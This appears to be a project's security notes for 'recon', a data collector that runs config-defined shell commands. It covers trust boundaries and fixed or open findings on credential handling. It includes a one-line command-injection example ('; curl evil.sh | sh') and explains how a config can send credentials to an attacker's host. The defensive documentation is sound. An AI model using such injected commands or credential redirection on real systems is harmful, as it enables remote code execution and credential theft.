# Security — recon

recon collects from heterogeneous sources — HTTP APIs, local CLIs, web pages — and
normalises the results to JSONL. Two things make it worth reading before you run someone
else's config: **a recon config runs shell commands**, and recon handles source
credentials.

Audience: anyone running `recon collect` against a config they did not write.

## Blast radius

A collect run may execute arbitrary shell commands, make outbound HTTP requests carrying
your credentials, and write files under the output directory.

## Trust boundaries

### 1. Config file → shell (`CliCollector`)

`PopenRunner.run_lines` executes with `shell=True`. The command string is built by
`substitute(entry.run, {"url": ..., "pattern": ...})` — string interpolation with **no
quoting**. Both `entry.run` and `entry.patterns` come from the config; `url` comes from
the referenced source entry.

**A recon config is executable. Reviewing one is reviewing a shell script.** A `pattern`
containing `; curl evil.sh | sh` runs. This is not a defect to be fixed by quoting: the
whole point of `run:` is to invoke a local tool with operator-chosen arguments, and
quoting it would break the feature. It is a boundary to be *known*.

What constrains it:

- The child starts in its own process group (`os.setsid` on POSIX), so a timeout kills the
  whole tree rather than only the shell — a runaway pipeline cannot outlive the run.
- `source.timeout` bounds the command (default 300s).

What does **not** constrain it: nothing restricts which binaries run, what they touch, or
where they connect. There is no allowlist.

### 2. Source entries → outbound credentials (`ApiCollector`)

A source entry names an environment variable holding its secret (`env:`), read through an
injected `Mapping` that defaults to `os.environ`. Two consequences:

- The secret is attached to requests to **whatever URL that source declares**. A config
  that points a credentialed source at an attacker's host exfiltrates the credential. The
  URL and the credential are chosen by the same file.
- Secrets are never written to the JSONL output and never logged. Request headers are
  never persisted. Response headers are persisted with credential-bearing values redacted
  — see R-2.

The injectable `env` mapping exists so tests never touch the real environment; it is also
the seam for scoping which variables a run can see.

### 3. Remote responses → local files

Collected records are attacker-influenced data by definition. recon writes them as JSONL
values, never as paths or commands. Output filenames come from the collector entry's
`name` in the config, not from response content.

## Findings

### R-1 — generator cleanup silenced to satisfy the type checker (fixed 2026-08-17)

`_sink` wraps its record stream in `contextlib.closing(records)`. During the strict-typing
pass the wrapper was removed because the parameter was typed `Iterable`, which
`closing()` rejects.

That wrapper is load-bearing, not decoration. `_sink` consumes a generator that may hold
an open subprocess pipe or HTTP connection; if the consumer raises partway, `closing()` is
what runs the generator's `finally` and releases it. Without it a failed collect leaks a
file descriptor and can leave a child process running.

Fixed by typing the parameter `Generator[dict[str, Any], None, None]` — the type it
actually is — so `closing()` type-checks and stays.

**Note on the regression test:** the first test written for this passed *with the bug
present* and was worthless. The discriminating case is a **suspended** generator (one with
a live `finally`) plus a **consumer that raises** — only that combination distinguishes
"cleanup happened" from "the generator was exhausted anyway".

### R-2 — raw capture persisted `Set-Cookie` verbatim (fixed 2026-08-18)

With `preserve_raw: true`, `FilesystemRawStore.save_http` wrote every response header
into `archive/<ts>/raw/<collector>/meta.yaml` unfiltered. A server that issued a session
cookie put a **live credential** into a file whose whole purpose is to be kept, committed,
and shared — the audit artefact was the leak.

Fixed: `redact_headers` replaces the values of a named set (`set-cookie`, `authorization`,
`x-api-key`, …), matched case-insensitively. The **key is preserved** so the capture still
proves the server set a cookie; only the value is gone. Dropping the header outright would
have destroyed the evidence the file exists to hold.

Regression: `recon/tests/test_raw_store_redaction.py`.

### R-3 — CLI capture records the substituted command (open, by design)

`finalize_stream` writes the fully-substituted `command` to `meta.yaml`. That is the point
— it is what makes a CLI capture reproducible. But a config that inlines a secret
(`run: curl -H 'Authorization: Bearer sk-...'`) puts that secret on disk.

Not fixed, and not fixable by redaction without guessing at shell syntax and breaking
reproducibility. **Keep credentials in environment variables referenced by a source's
`env:`, never inline in a `run:` string.** If you must inline one, treat the archive as
secret material.

## Not covered

- No sandboxing of collector commands. See boundary 1.
- No egress allowlist. A source may point anywhere.
- No TLS pinning; recon uses the platform trust store.

## Reporting

Open an issue on the gnx repository. Pre-gen-0 component; no embargo channel.
